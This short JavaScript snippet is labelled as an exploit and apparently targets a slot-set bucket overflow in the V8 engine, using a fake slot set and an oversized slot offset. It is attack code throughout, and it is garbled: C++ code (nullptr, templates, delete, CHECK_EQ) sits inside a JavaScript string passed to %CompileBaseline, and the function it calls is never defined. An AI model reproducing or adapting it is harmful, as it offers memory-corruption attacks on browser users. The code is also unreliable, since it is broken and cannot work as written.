(function exploit() {
  // Define fake slot set with buckets array
  const fakeSlotSet = {
    initial_buckets: {},
    buckets: []
  };
  global.__JS__._ = fakeSlotSet;

  // Compile a function that does the buggy Insert
  %CompileBaseline(
    "function f(slot_offset) {" +
    "  const slotsPerBucket = 32 * 32; // 1024" +
    "  const bucket_index = slot_offset / slotsPerBucket;" +
    "  const bucket = fakeSlotSet.buckets[bucket_index];" +
    "  if (bucket == nullptr) {" +
    "    bucket = new Bucket;" +
    "    if (!SwapInNewBucket<access_mode>(bucket_index, bucket)) {" +
    "      delete bucket;" +
    "      bucket = LoadBucket<access_mode>(bucket_index);" +
    "    }" +
    "  }" +
    "  CHECK_EQ(bucket->cells(), LoadBucket<access_mode>(bucket_index)->cells());" +
    "  uint32_t mask = 1u << ((slot_offset / 32) % 32);" +
    "  if ((bucket->template LoadCell<access_mode>((slot_offset / 32) % 32) & mask) == 0) {" +
    "    bucket->template unifyMask<access_mode>((slot_offset / 32) % 32, mask);" +
    "  }" +
    "}",
    "fakeSlotSet"
  );

  // Call with a huge slot_offset that overflows bucket array
  f( Number.MAX_SAFE_INTEGER * 2 );
})();
